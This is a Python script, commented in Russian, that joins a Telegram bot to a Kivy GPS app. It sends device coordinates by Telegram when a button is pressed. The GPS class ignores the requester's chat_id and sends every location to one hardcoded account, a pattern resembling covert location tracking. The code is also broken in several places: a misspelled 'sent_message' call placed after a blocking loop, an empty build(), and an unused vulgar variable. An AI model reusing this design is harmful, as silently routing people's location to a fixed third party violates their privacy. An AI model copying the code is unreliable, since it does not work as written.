import asyncio
from aiogram import F, Bot, Dispatcher, types
from aiogram.filters import Command
from kivy.app import App
from plyer import gps
from kbds import get_callback_btns
import os
from dotenv import find_dotenv, load_dotenv
from kivy.support import install_twisted_reactor
from threading import Thread

ewr = 'Писька'
load_dotenv(find_dotenv())
token = os.getenv("TOKEN")

# Инициализация бота
bot = Bot(token=token)
dp = Dispatcher()

class GeoApp(App):
    def __init__(self, chat_id, **kwargs):
        super().__init__(**kwargs)
        self.chat_id = 1020323448
        self.loop = asyncio.get_event_loop()


    def build(self):
        # Конфигурация GPS
        try:
            gps.configure(on_location=self.on_location)
            gps.start()
        except NotImplementedError:
            print("GPS не поддерживается на этом устройстве")
        return  # Пустой интерфейс

    def on_location(self, **kwargs):
        lat, lon = kwargs['lat'], kwargs['lon']
        # Отправляем координаты и закрываем приложение
        asyncio.run_coroutine_threadsafe(
            bot.send_location(chat_id=self.chat_id, latitude=lat, longitude=lon),
            self.loop
        )
        self.stop()


# Обработчики для бота
@dp.message(F.text == 'start')
async def start_handler(message: types.Message):
    await message.answer("Нажмите кнопку для получения геоданных:", 
                        reply_markup=get_callback_btns(btns={"📍 Получить геоданные": "get_geodata"}))

@dp.callback_query(F.data == 'get_geodata')
async def get_geodata_handler(callback: types.CallbackQuery):
    def run_geo_app():
        app = GeoApp(chat_id=callback.from_user.id)
        app.run()
    Thread(target=run_geo_app).start()
    await callback.answer("Запрос отправлен, ожидайте координаты.")


@dp.message(Command("stop"))
async def stop_app(message: types.Message):
    await message.answer("Приложение закрывается...")
    os._exit(0) 

async def main():
    await dp.start_polling(bot)
    await bot.sent_message(chat_id=1020323448, text="Бот запущен!")  # Замените на ваш chat_id

if __name__ == '__main__':
    install_twisted_reactor()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main())